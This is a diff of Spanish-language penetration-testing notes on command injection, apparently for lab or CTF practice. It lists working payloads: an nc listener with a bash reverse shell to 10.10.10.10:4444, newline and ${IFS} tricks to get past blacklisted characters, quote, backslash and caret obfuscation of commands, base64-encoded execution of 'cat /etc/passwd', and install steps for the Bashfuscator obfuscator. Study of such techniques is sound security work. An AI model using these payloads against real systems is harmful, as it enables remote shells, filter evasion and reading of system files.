@@ -193,13 +193,69 @@ EXPLOTACION
             COMMAND INJECTION
             .................
 
-                  1 - Probar en la barra de busqueda el resultado esperado + ; o && o | + Comando
-                  2 - Si se ejecutan comandos existe vulnerabilidad
-                  3 - Poner en escucha el kali 
-                        nc -lvnp 4444
-                  4 - Poner en el buscador el valor esperado + revershell
-                        bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
-                  5 - Debe conectarse, si no probar sh, perl, o cualquier otra shell
+                  SENCILLO
+                  ........
+
+                     1 - Probar en la barra de busqueda el resultado esperado + ; o && o | + Comando
+                     2 - Si se ejecutan comandos existe vulnerabilidad
+                     3 - Poner en escucha el kali 
+                           nc -lvnp 4444
+                     4 - Poner en el buscador el valor esperado + revershell
+                           bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+                     5 - Debe conectarse, si no probar sh, perl, o cualquier otra shell
+
+                  BYPASS BLACKLISTED 1 CHARACTER
+                  ..............................
+
+                     1 - Interceptamos con burpsuite
+                     2 - Enviamos a repeater
+                     3 - Probamos characteres normales
+                     4 - Si no funciona probamos %0a + comando
+                     5 - Si no funciona añadimos %0a%09 => %09 equivale a tabulacion
+                     6 - Probar si no %0a${IFS}
+                     7 - Probar %0a{ls,-la}
+                        
+                     Podemos añadir caracteres como ; / 
+                        echo ${PATH} => /usr/local/bin:/usr/bin:/bin:/usr/games
+                        ${PATH:0:1} => indica 0 donde inicia y el 1 numero de caracteres => Esto seria /
+                        ${IFS} => espacio 
+                        printenv => comando para ver todas las variables
+
+                           ${LS_COLORS:10:1} => ;
+                           ${PATH:0:1} => /
+                           %0a => \n => new-line
+                           ${IFS} => espacio
+                           %09 => tabulacion
+
+                  BYPASS BLACKLISTED COMMAND
+                  ..........................
+
+                     1 - Linux y Windows: Podemos ofuscar comandos usando ' o " => ej: w"h"o"am"i
+                     2 - Linux podemos usar \ => w\ho\am\i
+                     3 - Windows podemos usar ^ => who^ami
+                    
+                  OFUSCACION AVANZADA
+                  ...................
+
+                     1 - Servidor Windows => no distingue mayusculas y minusculas 
+                           Ofuscacion: WhOaMi  
+                     2 - Servido Linux => disntiguen mayusculas pero podemos ofuscar con tr(convierte en minusculas)
+                           ej: (tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+                     3 - Podemos escribir el comando leyendolo al reves => $(rev<<<'tac')
+                     4 - Podemos codificar el comando   
+                           echo -n 'cat /etc/passwd | grep 33' | base64 => Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
+                           bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+
+                  HERRAMIENTAS OFUSCACION
+                  .......................
+
+                     1 - Bashfuscator => ofuscador de comandos Linux
+                           git clone https://github.com/Bashfuscator/Bashfuscator
+                           cd Bashfuscator
+                           pip3 install setuptools==65
+                           python3 setup.py install --user
+                     2 - DOSfuscation => osfuscador de comandos windows
+
 
             CSRF/CROSS SITE REQUEST FORGERY
             ...............................
